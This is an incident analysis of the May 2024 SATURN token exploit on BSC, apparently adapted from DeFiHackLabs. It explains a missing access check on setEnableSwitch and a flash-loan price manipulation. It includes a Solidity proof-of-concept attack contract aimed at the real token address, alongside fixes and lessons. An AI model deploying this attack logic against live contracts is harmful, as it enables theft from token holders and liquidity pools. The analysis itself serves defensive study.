# SATURN — setEnableSwitch Manipulation + Flash Loan Price Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2024-05 |
| **Protocol** | SATURN |
| **Chain** | BSC |
| **Loss** | ~15 BNB |
| **Attacker** | [0xc468D9A3](https://bscscan.com/address/0xc468D9A3a5557BfF457586438c130E3AFbeC2ff9) |
| **Attack Contract** | [0xfcECDBC6](https://bscscan.com/address/0xfcECDBC62DEe7233E1c831D06653b5bEa7845FcC) |
| **SATURN Token** | [0x9BDF2514](https://bscscan.com/address/0x9BDF251435cBC6774c7796632e9C80B233055b93) |
| **Root Cause** | The `setEnableSwitch(bool)` function lacks access control, allowing any arbitrary caller to disable swaps, force-transfer tokens, then re-enable swaps and manipulate the AMM spot price for profit |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/SATURN_exp.sol) |

---

## 1. Vulnerability Overview

The `setEnableSwitch(bool)` function of the SATURN token can toggle swap functionality externally without any access control. The attacker first disabled swaps, force-transferred SATURN from holders, then re-enabled swaps. They then borrowed 3,300 WBNB via a PancakeSwap V3 flash loan, bought a large amount of SATURN to manipulate the price, and realized the profit.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: no access control on setEnableSwitch
contract SATURNToken {
    bool public swapEnabled = true;

    // No onlyOwner — anyone can disable swaps
    function setEnableSwitch(bool enabled) external {
        swapEnabled = enabled;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        if (!swapEnabled && isPair[to]) {
            revert("swap disabled");
        }
        // ...
    }
}

// ✅ Safe code
function setEnableSwitch(bool enabled) external onlyOwner {
    swapEnabled = enabled;
    emit SwapEnabled(enabled);
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] setEnableSwitch(false)
  │         └─ No access control → swaps disabled
  │
  ├─→ [2] Force-transfer SATURN from holders
  │         └─ Transfer possible while swaps are disabled
  │
  ├─→ [3] setEnableSwitch(true) → swaps re-enabled
  │
  ├─→ [4] PancakeSwap V3 flash loan: borrow 3,300 WBNB
  │
  ├─→ [5] WBNB → SATURN bulk buy (price manipulation)
  │
  ├─→ [6] Calculated SATURN transfer to distort price
  │
  ├─→ [7] SATURN → WBNB reverse swap (at manipulated price)
  │
  ├─→ [8] Repay V3 flash loan
  │
  └─→ [9] ~15 BNB profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface ISATURNToken {
    function setEnableSwitch(bool enabled) external;
    function everyTimeSellLimitAmount() external view returns (uint256);
}

interface IPancakeV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract AttackContract {
    ISATURNToken  constant saturn  = ISATURNToken(0x9BDF251435cBC6774c7796632e9C80B233055b93);
    IPancakeV3Pool constant v3Pool = IPancakeV3Pool(/* V3 WBNB pool */);
    IERC20 constant SATURN = IERC20(0x9BDF251435cBC6774c7796632e9C80B233055b93);
    IERC20 constant WBNB   = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    function testExploit() external {
        // [1] Disable swaps (no access control)
        saturn.setEnableSwitch(false);

        // [2] Force-transfer SATURN from holders
        transferFromHolder();

        // [3] Re-enable swaps
        saturn.setEnableSwitch(true);

        // [4] Flash loan
        v3Pool.flash(address(this), 0, 3_300e18, "");
    }

    function pancakeV3FlashCallback(uint256, uint256 fee1, bytes calldata) external {
        // [5] WBNB → SATURN bulk buy
        swapWBNBToSATURN(3_300e18);

        // [6] Complete price manipulation + reverse swap
        uint256 saturnBal = SATURN.balanceOf(address(this));
        uint256 sellLimit = saturn.everyTimeSellLimitAmount();
        SATURN.transfer(address(pair), sellLimit);  // price distortion

        swapSATURNToWBNB(saturnBal - sellLimit);

        // [7] Repay flash loan
        WBNB.transfer(address(v3Pool), 3_300e18 + fee1);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Missing Access Control (swap toggle) + Flash Loan Price Manipulation |
| **CWE** | CWE-284: Improper Access Control |
| **Attack Vector** | External (setEnableSwitch + flash loan) |
| **DApp Category** | Reflection/Tax Token |
| **Impact** | Token holder drainage + price manipulation (~15 BNB) |

## 6. Remediation Recommendations

1. **setEnableSwitch onlyOwner**: Restrict the swap enable toggle to owner only
2. **Block transfers during disable**: Block all transfers or pair transfers while swaps are disabled
3. **Flash loan price manipulation prevention**: Use TWAP-based pricing
4. **everyTimeSellLimitAmount consistency**: Decouple the sell limit from market price

## 7. Lessons Learned

- Protocol state-changing functions such as `setEnableSwitch()` must always have access control.
- Disabling swaps is a legitimate emergency stop mechanism, but making it callable by anyone paradoxically turns it into an attack tool.
- The two-stage attack combining missing access control and flash loan price manipulation is a recurring pattern in BSC tokens.